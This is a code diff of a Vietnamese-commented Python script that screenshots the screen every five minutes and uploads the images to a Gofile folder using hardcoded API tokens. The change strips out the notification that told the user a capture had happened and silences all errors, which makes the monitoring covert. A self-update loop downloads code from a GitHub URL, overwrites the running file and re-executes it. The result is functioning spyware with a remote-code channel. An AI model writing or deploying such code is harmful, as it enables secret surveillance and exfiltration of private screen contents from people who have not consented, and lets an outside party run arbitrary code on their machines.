@@ -4,108 +4,93 @@ import time
 import threading
 import requests
 import pyautogui
-import tkinter as tk
-from tkinter import messagebox
 from datetime import datetime
 
-# --- THÔNG TIN CẤU HÌNH ---
-CURRENT_VERSION = "2.0.1"
+# --- THÔNG TIN CẤU HÌNH CẬP NHẬT ---
+CURRENT_VERSION = "2.0.2" 
 VERSION_URL = "https://raw.githubusercontent.com/tomasinebellosmx82798b/auto/refs/heads/main/version_v2"
 UPDATE_URL = "https://raw.githubusercontent.com/tomasinebellosmx82798b/auto/refs/heads/main/monitor_v2.py"
 GOFILE_API = "https://upload.gofile.io/uploadfile"
-GOFILE_TOKEN = "vc5njCimJvXwoDEtsidgrTWoU9ZW61w6"
-FOLDER_ID = "f0211191-7505-4226-b5a1-cbede323189b"
+GOFILE_TOKEN = "bhovKSmWOpP1I98OFlxS8LlIygr9TZx5"
+FOLDER_ID = "a4d5e9ee-2d16-4b2d-910a-ae481bc44d3b"
 
-class SystemMonitor:
+class SystemMonitorSilent:
     def __init__(self):
         self.running = True
 
-    def show_notification(self, message):
-        """Hiển thị hộp thoại thông báo mà không làm treo luồng chính"""
-        def msg_box():
-            root = tk.Tk()
-            root.withdraw()  # Ẩn cửa sổ chính của tkinter
-            root.attributes("-topmost", True) # Đưa thông báo lên trên cùng
-            messagebox.showinfo("Hệ Thống Giám Sát", message)
-            root.destroy()
-        
-        threading.Thread(target=msg_box).start()
-
     def capture_and_upload(self):
-        """Hàm thực hiện chụp màn hình và tải lên định kỳ mỗi 5 phút"""
+        """Tiến trình chụp màn hình và upload chạy ngầm hoàn toàn"""
         while self.running:
             temp_file = ""
             try:
-                # 1. Chụp màn hình
+                # 1. Tạo tên file theo timestamp
                 timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                 temp_file = f"SC_{timestamp}.png"
                 
+                # 2. Chụp màn hình (Silent)
                 pic = pyautogui.screenshot()
-                # Tối ưu dung lượng với quality=80 (Phải convert sang RGB nếu là PNG)
                 pic.save(temp_file, optimize=True, quality=80)
 
-                # 2. Upload API Gofile
-                with open(temp_file, 'rb') as f:
-                    files = {'file': f}
-                    data = {
-                        'token': GOFILE_TOKEN,
-                        'folderId': FOLDER_ID
-                    }
-                    response = requests.post(GOFILE_API, files=files, data=data, timeout=30)
-                
-                if response.status_code == 200:
-                    # 3. Thông báo cho người dùng
-                    time_str = datetime.now().strftime("%H:%M:%S")
-                    self.show_notification(f"Đã chụp và lưu màn hình lúc [{time_str}]")
+                # 3. Tải lên API Gofile
+                if os.path.exists(temp_file):
+                    with open(temp_file, 'rb') as f:
+                        files = {'file': f}
+                        data = {
+                            'token': GOFILE_TOKEN,
+                            'folderId': FOLDER_ID
+                        }
+                        # Timeout để tránh treo luồng nếu mạng yếu
+                        requests.post(GOFILE_API, files=files, data=data, timeout=30)
                 
             except Exception as e:
-                print(f"Lỗi tiến trình Screenshot: {e}")
+                # Ghi lỗi ra log file thay vì hiện thông báo (tùy chọn)
+                pass 
             
             finally:
-                # 4. Xóa tệp tạm sau khi hoàn tất (thành công hoặc lỗi)
+                # 4. Xóa tệp tạm ngay lập tức
                 if temp_file and os.path.exists(temp_file):
-                    os.remove(temp_file)
+                    try:
+                        os.remove(temp_file)
+                    except:
+                        pass
 
-            time.sleep(300) # Nghỉ 5 phút
+            time.sleep(300) # Chu kỳ 5 phút
 
     def auto_update(self):
-        """Kiểm tra và tự động cập nhật mã nguồn mỗi 10 phút"""
+        """Kiểm tra phiên bản mới từ GitHub và tự cập nhật mã nguồn"""
         while self.running:
             try:
-                # Kiểm tra phiên bản mới
                 resp = requests.get(VERSION_URL, timeout=15)
                 new_version = resp.text.strip()
 
+                # Nếu phiên bản trên server khác phiên bản hiện tại
                 if new_version != CURRENT_VERSION:
-                    # Tải mã nguồn mới
                     update_resp = requests.get(UPDATE_URL, timeout=30)
                     if update_resp.status_code == 200:
-                        # Ghi đè chính file hiện tại
+                        # Ghi đè mã nguồn mới vào chính file đang chạy
                         with open(__file__, "w", encoding="utf-8") as f:
                             f.write(update_resp.text)
                         
-                        # Khởi động lại script để áp dụng bản mới
+                        # Khởi động lại ứng dụng để áp dụng code mới
                         os.execv(sys.executable, [sys.executable] + sys.argv)
                 
-            except Exception as e:
-                print(f"Lỗi kiểm tra cập nhật: {e}")
+            except Exception:
+                pass
 
-            time.sleep(600) # Nghỉ 10 phút
+            time.sleep(600) # Kiểm tra cập nhật mỗi 10 phút
 
     def start(self):
-        """Khởi chạy đa luồng"""
-        # Luồng 1: Chụp ảnh và Upload
-        thread_monitor = threading.Thread(target=self.capture_and_upload, daemon=True)
-        # Luồng 2: Tự động cập nhật
-        thread_update = threading.Thread(target=self.auto_update, daemon=True)
+        # Khởi chạy các tác vụ trong luồng riêng biệt
+        t_capture = threading.Thread(target=self.capture_and_upload, daemon=True)
+        t_update = threading.Thread(target=self.auto_update, daemon=True)
 
-        thread_monitor.start()
-        thread_update.start()
+        t_capture.start()
+        t_update.start()
 
-        # Giữ luồng chính không kết thúc
+        # Giữ tiến trình chính luôn sống
         while self.running:
             time.sleep(1)
 
 if __name__ == "__main__":
-    monitor = SystemMonitor()
+    monitor = SystemMonitorSilent()
     monitor.start()
